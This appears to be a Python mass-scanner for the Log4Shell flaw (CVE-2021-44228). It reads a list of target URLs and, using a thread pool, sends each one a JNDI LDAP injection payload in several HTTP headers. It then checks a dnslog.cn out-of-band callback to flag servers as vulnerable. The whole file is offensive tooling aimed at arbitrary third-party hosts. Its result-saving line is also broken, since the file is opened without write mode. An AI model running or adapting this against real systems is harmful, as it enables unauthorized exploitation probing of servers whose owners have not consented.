# This is just a random project that I made, so don't expect more :p
# Actually I just checked via Vulnerable Application from https://github.com/christophetd/log4shell-vulnerable-app (because I'm lazy to find live target xD)
# so you can develop or change this code according to your knowledge ;)
# Fb : fb.com/akazh18
# GH : github.com/justakazh

import requests
import sys
from random import random
from multiprocessing.dummy import Pool



class logporje:

	def __init__(self):
		self.banner()
		a = [i.strip() for i in open(str(input("List : ")), "r").readlines()]
		x = Pool(int(input("Pool : ")))
		x.map(self.galer, a)

	def banner(self):
		print("""
.____                    _____     __ 
|    |    ____   ____   /  |  |   |__|
|    |   /  _ \ / ___\ /   |  |_  |  |
|    |__(  <_> ) /_/  >    ^   /  |  |
|_______ \____/\___  /\____   /\__|  |
        \/    /_____/      |__\______|

Mass check CVE-2021-44228
Coded by : justakazh
------------------------------------------

			""")

	def galer(self, url):
		try:
			# just make session request :p
			s = requests.session()

			#make a random float for get dnslog 
			mppsh = random()

			#get a domain 
			lerr = s.get("http://dnslog.cn/getdomain.php?t="+str(mppsh)).text
			ur_pler = lerr #domain

			payload = "${jndi:ldap://"+ur_pler+"}" # this is basic payload, u can change by ur 1337 payload
			
			# u can custom header for locate ur payload
			r = requests.get(url, headers={"X-Api-Version": payload, "User-Agent": payload, "Referer": payload})

			#request to check records
			x = s.get("http://dnslog.cn/getrecords.php?t="+str(mppsh))
			
			#if ur domain exist in response body u get a vulnerable
			if ur_pler in x.text:
				print("[+] Vuln "+url+ " : "+ x.text)
				open("_Result").write(url+"\n") # Save result :p
			else:
				print("[-] Bad "+url + " : "+ x.text)
		except Exception as e:
			pass




if __name__ == "__main__":
	try:
		Log4j = logporje()
	except KeyboardInterrupt:
		print("[!] Process stoped by user\n")
		sys.exit(1)